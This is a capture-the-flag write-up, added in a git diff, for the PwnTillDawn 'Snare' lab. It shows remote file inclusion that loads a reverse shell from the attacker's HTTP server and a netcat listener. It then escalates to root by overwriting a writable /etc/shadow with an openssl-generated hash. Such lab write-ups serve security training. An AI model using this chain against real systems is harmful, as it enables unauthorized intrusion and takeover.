@@ -116,12 +116,124 @@ We have 2 ports  opened here. Port 22 which runs ssh and port 80 which runs http
 
 
 
+<h2>Enumeration</h2>
+
+Going to the webpage should get you this
+
+![image](https://user-images.githubusercontent.com/67879936/222952400-04a80c1e-e267-45d3-91df-7f37b07d8657.png)
+
+Lets test this site for possible RFI (Remote File Inclusion).
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ ls
+snare
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Link:http://10.150.150.18/index.php?page=http://10.66.67.154/snare
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ ls
+snare
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.150.150.18 - - [05/Mar/2023 10:48:34] code 404, message File not found
+10.150.150.18 - - [05/Mar/2023 10:48:34] "GET /snare.php HTTP/1.0" 404 -
+```
+As you can see we got a 404 error, why is that?? This is because a .php extension is automatically added to the end of our file when we run it. 
+
+So, to exploit this we will put our reverse shell in a file named ```shell.php```, so when we run it in the browser we will exclude the ```.php``` because the extension will be automatically a added to it and this executes our shell for us.
+
+I'll be making use of pentester monkey
+
+you can get it here:https://github.com/pentestmonkey/php-reverse-shell
+
+Ensure you set your $ip and also the port you will want to listen on
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ gedit shell.php
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ file shell.php 
+shell.php: PHP script, ASCII text
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+On the webserver,
+
+Link:http://10.150.150.18/index.php?page=http://10.66.67.154/shell
+
+Ensure you set your netcat listener before running your reverse shell
+
+>rlwrap nc -nvlp 1234
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ gedit shell.php
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ file shell.php 
+shell.php: PHP script, ASCII text
+                                                                                                                                                                        
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.150.150.18 - - [05/Mar/2023 11:02:14] "GET /shell.php HTTP/1.0" 200 -
+```
+Back to our listener
+
+![image](https://user-images.githubusercontent.com/67879936/222953945-02b02b9f-4a96-415b-a1db-4899868b1019.png)
+
+cool, we got a shell back to our machine as user  ```www-data```. The first flag is in _/home/snare_ directory
+
+![image](https://user-images.githubusercontent.com/67879936/222954218-ab7a8d2a-bf99-45a8-9c99-20a9b3a80ba7.png)
+
+Now, lets go ahead and escalate our privileges
 
 
 
 
+<h2>Privilege Escalation</h2>
 
+I ran linpeas on the target's machine
 
+![image](https://user-images.githubusercontent.com/67879936/222954750-47496b56-55a4-4b4f-bed8-31dcf8b131da.png)
+
+cool, from our scan we can see that ```/etc/shadow``` file is writable. Now lets go ahead and modify the /etc/shadow file
+
+![image](https://user-images.githubusercontent.com/67879936/222954843-b6891a89-42de-4e32-8b8d-1ea234669e13.png)
+
+We'll be replacing the highlighted part with the password we'll generate using openssl.
+
+>command:openssl passwd 1234567890
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/snare]
+└─$ openssl passwd 1234567890
+$1$rrF3V8JB$AJ0hBjitFidwtoLWc5R0S/
+```
+cool, now lets copy and paste this into the ```/etc/shadow``` file
+
+![image](https://user-images.githubusercontent.com/67879936/222955049-f0faf0b0-5b6e-4f1d-b93b-81457817941c.png)
+
+We've successfully changed the root's password. Now lets switch user to ```root``` using password ```1234567890```
+
+![image](https://user-images.githubusercontent.com/67879936/222955120-ebbb4c68-27ac-421f-93c8-fcbef7420e33.png)
+
+Boom!!! We got the root shell. Also as you can see we found the second flag in the _/root_ directory.
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
